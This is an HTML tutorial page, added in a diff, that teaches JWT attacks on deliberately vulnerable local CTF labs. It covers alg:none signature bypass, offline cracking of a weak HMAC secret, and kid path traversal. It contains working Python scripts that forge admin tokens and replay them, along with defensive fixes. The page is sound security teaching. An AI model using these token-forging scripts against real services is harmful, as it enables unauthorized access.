@@ -1,0 +1,396 @@
+<!DOCTYPE html><html lang="en"><head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>JWT Attacks | h5i web security tutorial</title><meta name="description" content="Decode JSON Web Tokens, bypass a missing signature check, crack a weak HMAC secret, and turn a key identifier into a path traversal.">
+<meta name="author" content="h5i-dev"><meta name="theme-color" content="#D21C1C">
+<meta name="color-scheme" content="dark"><meta name="robots" content="index, follow, max-image-preview:large">
+<link rel="canonical" href="https://h5i.dev/guides/jwt-attacks/"><link rel="icon" type="image/png" href="/_static/logo.png">
+<meta property="og:type" content="article"><meta property="og:site_name" content="h5i">
+<meta property="og:title" content="JWT Attacks | h5i web security tutorial"><meta property="og:description" content="Decode JSON Web Tokens, bypass a missing signature check, crack a weak HMAC secret, and turn a key identifier into a path traversal.">
+<meta property="og:url" content="https://h5i.dev/guides/jwt-attacks/"><meta property="og:image" content="https://h5i.dev/_static/sandboxed-browser-ui.png">
+<meta property="og:image:alt" content="An h5i browser session: the page an AI agent is reading, beside the request log the engine wrote before any bytes moved"><meta property="og:locale" content="en_US">
+<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="JWT Attacks | h5i web security tutorial">
+<meta name="twitter:description" content="Decode JSON Web Tokens, bypass a missing signature check, crack a weak HMAC secret, and turn a key identifier into a path traversal."><meta name="twitter:image" content="https://h5i.dev/_static/sandboxed-browser-ui.png">
+<meta name="twitter:image:alt" content="An h5i browser session: the page an AI agent is reading, beside the request log the engine wrote before any bytes moved">
+<script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "TechArticle",
+      "headline": "JWT Attacks",
+      "description": "Decode JSON Web Tokens, bypass a missing signature check, crack a weak HMAC secret, and turn a key identifier into a path traversal.",
+      "author": {
+        "@type": "Organization",
+        "name": "h5i-dev"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "name": "h5i"
+      },
+      "datePublished": "2026-09-13",
+      "dateModified": "2026-09-15",
+      "image": "https://h5i.dev/_static/sandboxed-browser-ui.png",
+      "inLanguage": "en",
+      "isPartOf": {
+        "@id": "https://h5i.dev/#website"
+      },
+      "mainEntityOfPage": "https://h5i.dev/guides/jwt-attacks/"
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "Home",
+          "item": "https://h5i.dev/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "Guides",
+          "item": "https://h5i.dev/guides/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 3,
+          "name": "JWT Attacks",
+          "item": "https://h5i.dev/guides/jwt-attacks/"
+        }
+      ]
+    }
+  ]
+}</script>
+<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Archivo:wght@700;800;900&amp;family=Space+Grotesk:wght@300;400;500;700&amp;family=Space+Mono:wght@400;700&amp;display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/_static/blog.css?v=20ea6351e0"><link rel="stylesheet" href="/_static/highlight.css?v=45984d5155">
+</head>
+<body><nav class="blog-nav">
+  <a class="nav-logo" href="/"><img src="/_static/logo.png" alt="h5i"><span>h5i</span></a>
+  <ul class="nav-links">
+    <li><a href="/features/">Features</a></li><li><a href="/guides/">Guides</a></li>
+    <li><a href="/manual/">Manual</a></li><li><a href="/blog/">Blog</a></li>
+    <li><a href="https://github.com/h5i-dev/h5i" class="nav-cta">GitHub &rarr;</a></li>
+  </ul>
+</nav><main class="article-wrap"><article class="post">
+<header><div class="post-eyebrow">Tutorial 03 / Tokens &middot; 2026-09-13</div>
+<h1>JWT Attacks</h1><p class="post-deck">A beginner-friendly CTF tutorial: decode JSON Web Tokens, bypass a missing signature check, crack a weak HMAC secret, and turn a key identifier into a path traversal.</p>
+<div class="post-meta"><span>9 min read</span><span>JWT &middot; alg confusion &middot; kid injection &middot; Labs 10&ndash;11</span></div></header>
+<p>In <a href="/guides/broken-access-control/">Broken Access Control</a>, we tested access control by changing the user and the fields in a request. In this article, we will attack a different part of authentication: the token that tells the server who the user is.</p>
+<p>Using Labs 10 and 11 of <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial</a>, we will learn:</p>
+<ul>
+<li>what the three parts of a JSON Web Token mean;</li>
+<li>why decoding a JWT does not verify it;</li>
+<li>how <code>alg: none</code> can make a signature optional;</li>
+<li>why a weak HMAC secret can be tested offline; and</li>
+<li>how an unsafe <code>kid</code> lookup can let an attacker choose the verification key.</li>
+</ul>
+<p>We will use <a href="https://github.com/h5i-dev/h5i">h5i</a> to capture a real token, construct modified versions, and replay a request with a different <code>Authorization</code> header.</p>
+<p>The targets are deliberately vulnerable local labs. Only test systems you own or have explicit permission to assess.</p>
+<h2 id="before-we-begin">Before we begin</h2>
+<p>You need Python 3.11 or later, h5i, and the <code>websec</code> plugin. See the <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec#1-setup">course setup</a> for installation details.</p>
+<pre><code class="language-bash">$ git clone https://github.com/h5i-dev/h5i-tutorial.git
+$ cd h5i-tutorial/websec
+$ h5i websec --help
+</code></pre>
+<h2 id="what-is-a-jwt">What is a JWT?</h2>
+<p>A <strong>JSON Web Token</strong>, or <strong>JWT</strong>, is a compact string commonly used to carry claims about a user. A token usually looks like this:</p>
+<pre><code class="language-text">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJndWVzdCIsInJvbGUiOiJndWVzdCJ9.signature
+</code></pre>
+<p>It has three dot-separated parts:</p>
+<pre><code class="language-text">header.payload.signature
+</code></pre>
+<p>The <strong>header</strong> describes how the token is signed. The <strong>payload</strong> contains claims such as the user ID, role, issuer, and expiration time. The <strong>signature</strong> lets the server detect changes to the first two parts.</p>
+<p>The header and payload are normally Base64url-encoded. Base64 is an encoding, not encryption. Anyone holding the token can decode and modify those sections. Security comes from the server verifying the signature with the correct algorithm and key.</p>
+<p>That verification step is exactly what we will test.</p>
+<h2 id="lab-10-inspect-the-guest-token">Lab 10: inspect the guest token</h2>
+<p>Start the Passport lab:</p>
+<pre><code class="language-bash">$ ./run.sh 10
+</code></pre>
+<p>Open the token endpoint:</p>
+<pre><code class="language-bash">$ h5i browser open 'http://127.0.0.1:9100/api/token' \
+  --session lab10 --new --capture
+$ h5i websec show res_0 --session lab10 --raw
+</code></pre>
+<p>The response contains a guest JWT. Copy the token into a shell variable:</p>
+<pre><code class="language-bash">$ TOKEN='PASTE_THE_TOKEN_HERE'
+</code></pre>
+<p>Decode its header and payload:</p>
+<pre><code class="language-bash">$ TOKEN=&quot;$TOKEN&quot; python3 - &lt;&lt;'PY'
+import base64
+import json
+import os
+
+token = os.environ[&quot;TOKEN&quot;]
+decode = lambda part: base64.urlsafe_b64decode(
+    part + &quot;=&quot; * (-len(part) % 4)
+)
+
+header, payload, signature = token.split(&quot;.&quot;)
+print(json.loads(decode(header)))
+print(json.loads(decode(payload)))
+print(&quot;signature bytes:&quot;, len(decode(signature)))
+PY
+</code></pre>
+<p>The result is similar to:</p>
+<pre><code class="language-text">{'alg': 'HS256', 'typ': 'JWT'}
+{'sub': 'guest', 'role': 'guest', 'iss': 'passport'}
+signature bytes: 32
+</code></pre>
+<p><code>HS256</code> means the server uses HMAC with SHA-256. The server and token issuer share a secret key. The header and payload are signed using that key, and the server should reject any token whose signature does not match.</p>
+<h2 id="attack-1-make-the-signature-optional">Attack 1: make the signature optional</h2>
+<p>The JWT header is attacker-controlled input. A dangerous verifier may read the algorithm from that header and accept <code>none</code>, meaning no cryptographic signature.</p>
+<p>Create a token whose payload claims the <code>admin</code> role:</p>
+<pre><code class="language-bash">$ FORGED=$(python3 - &lt;&lt;'PY'
+import base64
+import json
+
+def part(obj):
+    raw = json.dumps(obj, separators=(&quot;,&quot;, &quot;:&quot;)).encode()
+    return base64.urlsafe_b64encode(raw).rstrip(b&quot;=&quot;).decode()
+
+header = part({&quot;alg&quot;: &quot;none&quot;, &quot;typ&quot;: &quot;JWT&quot;})
+payload = part({
+    &quot;sub&quot;: &quot;guest&quot;,
+    &quot;role&quot;: &quot;admin&quot;,
+    &quot;iss&quot;: &quot;passport&quot;,
+})
+print(header + &quot;.&quot; + payload + &quot;.&quot;)
+PY
+)
+</code></pre>
+<p>The trailing dot matters. It leaves the third, signature segment empty while preserving the three-part JWT structure.</p>
+<p>Replay the captured request, changing its path and adding the token:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab10 --create \
+  --set path=/api/vault \
+  --set &quot;header.Authorization=Bearer $FORGED&quot;
+</code></pre>
+<p>Note the <code>seq</code> in the replay output and inspect the corresponding response:</p>
+<pre><code class="language-bash">$ h5i websec show res_1 --session lab10 --raw
+</code></pre>
+<p>The response contains:</p>
+<pre><code class="language-text">FLAG{jwt_alg_confusion}
+</code></pre>
+<p>We changed the role without knowing any secret because the verifier accepted a token with no signature.</p>
+<h3 id="why-did-this-work">Why did this work?</h3>
+<p>The vulnerable verifier reads <code>alg</code> from the untrusted token:</p>
+<pre><code class="language-python">alg = head.get(&quot;alg&quot;, &quot;HS256&quot;)
+
+if alg.lower() == &quot;none&quot;:
+    return claims
+</code></pre>
+<p>The <code>none</code> branch returns the claims before verifying a signature. The attacker therefore controls both the decision to skip verification and the claims returned after it.</p>
+<p>The server must choose the accepted algorithm. The token must not choose how its own authenticity will be checked.</p>
+<h2 id="attack-2-crack-a-weak-hmac-secret">Attack 2: crack a weak HMAC secret</h2>
+<p>Lab 10 contains a second, independent weakness. Even when it follows the <code>HS256</code> path, the signing secret is a dictionary word.</p>
+<p>An HMAC JWT gives us everything required to test candidate secrets locally:</p>
+<ul>
+<li>the encoded header and payload;</li>
+<li>the correct signature; and</li>
+<li>the signing algorithm.</li>
+</ul>
+<p>Testing guesses requires no further requests to the server. This is an <strong>offline attack</strong>, so login rate limits do not help.</p>
+<p>Try a small wordlist against the original guest token:</p>
+<pre><code class="language-bash">$ SECRET=$(TOKEN=&quot;$TOKEN&quot; python3 - &lt;&lt;'PY'
+import base64
+import hashlib
+import hmac
+import os
+
+token = os.environ[&quot;TOKEN&quot;]
+signed, _, signature = token.rpartition(&quot;.&quot;)
+
+def b64(raw):
+    return base64.urlsafe_b64encode(raw).rstrip(b&quot;=&quot;).decode()
+
+words = [
+    &quot;secret&quot;,
+    &quot;password&quot;,
+    &quot;changeme&quot;,
+    &quot;letmein&quot;,
+    &quot;jwt&quot;,
+    &quot;key&quot;,
+    &quot;admin&quot;,
+    &quot;test&quot;,
+]
+
+for word in words:
+    candidate = hmac.new(
+        word.encode(),
+        signed.encode(),
+        hashlib.sha256,
+    ).digest()
+    if hmac.compare_digest(b64(candidate), signature):
+        print(word)
+        break
+PY
+)
+
+$ printf '%s\n' &quot;$SECRET&quot;
+letmein
+</code></pre>
+<p>Now use that secret to create a correctly signed admin token:</p>
+<pre><code class="language-bash">$ SIGNED_ADMIN=$(SECRET=&quot;$SECRET&quot; python3 - &lt;&lt;'PY'
+import base64
+import hashlib
+import hmac
+import json
+import os
+
+def b64(raw):
+    return base64.urlsafe_b64encode(raw).rstrip(b&quot;=&quot;).decode()
+
+def part(obj):
+    return b64(json.dumps(obj, separators=(&quot;,&quot;, &quot;:&quot;)).encode())
+
+header = part({&quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;})
+payload = part({
+    &quot;sub&quot;: &quot;guest&quot;,
+    &quot;role&quot;: &quot;admin&quot;,
+    &quot;iss&quot;: &quot;passport&quot;,
+})
+signed = header + &quot;.&quot; + payload
+signature = hmac.new(
+    os.environ[&quot;SECRET&quot;].encode(),
+    signed.encode(),
+    hashlib.sha256,
+).digest()
+
+print(signed + &quot;.&quot; + b64(signature))
+PY
+)
+</code></pre>
+<p>Send it to the same endpoint:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab10 --create \
+  --set path=/api/vault \
+  --set &quot;header.Authorization=Bearer $SIGNED_ADMIN&quot;
+</code></pre>
+<p>This token passes the normal signature check. The vulnerability is no longer a missing check; it is a signing key that an attacker can recover cheaply.</p>
+<p>Use a randomly generated secret with enough entropy, store it outside source code, and rotate it when exposure is possible.</p>
+<h2 id="lab-11-when-kid-becomes-a-file-path">Lab 11: when <code>kid</code> becomes a file path</h2>
+<p>Start the Keyring lab:</p>
+<pre><code class="language-bash">$ ./run.sh 11
+</code></pre>
+<p>Open its token endpoint and inspect the returned JWT:</p>
+<pre><code class="language-bash">$ h5i browser open 'http://127.0.0.1:9110/api/token' \
+  --session lab11 --new --capture
+$ h5i websec show res_0 --session lab11 --raw
+</code></pre>
+<p>Decode the token as before. This header contains an additional field:</p>
+<pre><code class="language-json">{
+  &quot;alg&quot;: &quot;HS256&quot;,
+  &quot;typ&quot;: &quot;JWT&quot;,
+  &quot;kid&quot;: &quot;main.key&quot;
+}
+</code></pre>
+<p><code>kid</code> means <strong>key ID</strong>. It lets a verifier choose among multiple signing keys, which is useful during key rotation.</p>
+<p>The danger is that the value comes from the untrusted token. The server must map it to a known key safely.</p>
+<p>In this lab, it does not:</p>
+<pre><code class="language-python">def key_for(kid):
+    return (ROOT / &quot;keys&quot; / kid).read_bytes()
+</code></pre>
+<p>The server treats <code>kid</code> as part of a filesystem path. Therefore:</p>
+<pre><code class="language-text">../static/brand.txt
+</code></pre>
+<p>escapes the <code>keys</code> directory and selects a public static file as the HMAC key.</p>
+<p>We do not need to read the real secret key. We need to make the verifier use a file whose bytes we already know.</p>
+<h3 id="save-the-exact-key-bytes">Save the exact key bytes</h3>
+<p>Fetch the public brand file through the same captured session:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab11 \
+  --set path=/static/brand.txt
+
+$ WORK=$(mktemp -d)
+$ h5i websec show res_1 --session lab11 \
+  --body-to &quot;$WORK/brand.txt&quot;
+</code></pre>
+<p><code>--body-to</code> writes the response body exactly as received. That matters because the file includes a trailing newline. Copying visible terminal text can lose that byte and produce the wrong HMAC.</p>
+<p>Now create an admin token whose <code>kid</code> points to the public file:</p>
+<pre><code class="language-bash">$ FORGED=$(python3 - &quot;$WORK/brand.txt&quot; &lt;&lt;'PY'
+import base64
+import hashlib
+import hmac
+import json
+import sys
+
+key = open(sys.argv[1], &quot;rb&quot;).read()
+
+def b64(raw):
+    return base64.urlsafe_b64encode(raw).rstrip(b&quot;=&quot;).decode()
+
+def part(obj):
+    return b64(json.dumps(obj, separators=(&quot;,&quot;, &quot;:&quot;)).encode())
+
+header = part({
+    &quot;alg&quot;: &quot;HS256&quot;,
+    &quot;typ&quot;: &quot;JWT&quot;,
+    &quot;kid&quot;: &quot;../static/brand.txt&quot;,
+})
+payload = part({&quot;sub&quot;: &quot;guest&quot;, &quot;role&quot;: &quot;admin&quot;})
+signed = header + &quot;.&quot; + payload
+signature = hmac.new(key, signed.encode(), hashlib.sha256).digest()
+
+print(signed + &quot;.&quot; + b64(signature))
+PY
+)
+</code></pre>
+<p>Send it to the protected HSM endpoint:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab11 --create \
+  --set path=/api/hsm \
+  --set &quot;header.Authorization=Bearer $FORGED&quot;
+</code></pre>
+<p>The response contains:</p>
+<pre><code class="language-text">FLAG{jwt_kid_injection}
+</code></pre>
+<p>The signature is cryptographically valid. The bug is that the attacker selected the key used to validate it.</p>
+<h3 id="fixing-key-selection">Fixing key selection</h3>
+<p>The safe pattern is a fixed server-side map:</p>
+<pre><code class="language-python">KEYS = {
+    &quot;main-2026&quot;: current_key,
+    &quot;main-2025&quot;: previous_key,
+}
+
+key = KEYS.get(header.get(&quot;kid&quot;))
+if key is None:
+    reject()
+</code></pre>
+<p>Reject unknown identifiers. Do not concatenate <code>kid</code> into a path, SQL query, shell command, or arbitrary URL.</p>
+<p>JWT headers such as <code>jku</code> and <code>x5u</code> can name remote key locations. A verifier should ignore them unless the application has a strict, server-controlled allowlist and a genuine need to fetch keys remotely.</p>
+<h2 id="a-reusable-jwt-testing-method">A reusable JWT testing method</h2>
+<p>When an application gives you a JWT:</p>
+<ol>
+<li>Decode the header and payload without assuming they are trustworthy.</li>
+<li>Identify the algorithm and every key-selection field.</li>
+<li>Check whether the verifier accepts an unsigned token.</li>
+<li>If HMAC is used, test whether the secret is weak—offline.</li>
+<li>Follow <code>kid</code>, <code>jku</code>, and <code>x5u</code> into the code or behavior that resolves the key.</li>
+<li>Check important claims such as issuer, audience, and expiration.</li>
+<li>Confirm the result by reaching a protected action, not merely by creating a token-shaped string.</li>
+</ol>
+<p>Do not report “the JWT can be decoded.” That is normal. The finding begins when modified claims pass verification or when a token is accepted outside the context for which it was issued.</p>
+<h2 id="summary">Summary</h2>
+<p>Lab 10 showed two independent JWT failures. <code>alg: none</code> allowed us to omit the signature, while a weak HMAC secret allowed us to generate a valid signature ourselves.</p>
+<p>Lab 11 used a valid HMAC construction with a dangerous key lookup. By placing <code>../static/brand.txt</code> in <code>kid</code>, we made the server verify our token using public bytes.</p>
+<p>The common lesson is that cryptography does not rescue unsafe control flow. The server must fix the algorithm, validate all required claims, and select keys only from trusted server-side configuration.</p>
+<p>When finished:</p>
+<pre><code class="language-bash">$ h5i browser close --session lab10
+$ h5i browser close --session lab11
+$ rm -rf &quot;$WORK&quot;
+$ ./run.sh stop
+</code></pre>
+<p>In <a href="/guides/sql-injection/">SQL Injection</a>, we will move from authentication to SQL injection, beginning with visible database errors and ending with secrets extracted one bit—or one delay—at a time.</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://github.com/h5i-dev/h5i">h5i</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial: Web application security</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/10-jwt-alg-confusion">Lab 10: JWT algorithm confusion</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/11-jwt-kid-injection">Lab 11: JWT <code>kid</code> injection</a></li>
+</ul>
+
+<a class="next-up" href="/guides/sql-injection/"><span class="label">Next in the series</span><h3>SQL Injection</h3><p>Turn a broken search query into a database read, then extract secrets when the application reveals only a boolean or only its response time.</p></a>
+<div class="post-cta"><h3>Run the labs yourself</h3><p>42 deliberately vulnerable applications, one binary, no Docker and no accounts.</p>
+<div class="hero-actions"><a class="btn btn-primary" href="https://github.com/h5i-dev/h5i-tutorial">Open h5i-tutorial</a></div></div>
+</article></main><footer class="blog-footer"><div class="blog-footer-inner">
+  <div class="brand">h5i<span class="red"> / high-five</span></div>
+  <nav class="links"><a href="/">Home</a><a href="/guides/">Guides</a><a href="/blog/">Blog</a><a href="/manual/">Manual</a><a href="https://github.com/h5i-dev/h5i">GitHub</a></nav>
+  <div class="legal">Apache 2.0 &middot; Built with Rust</div>
+</div></footer>
+<script src="/_static/blog.js?v=41dbda103a" defer></script><script src="/_static/highlight.js?v=ed81eee4e6" defer></script></body></html>
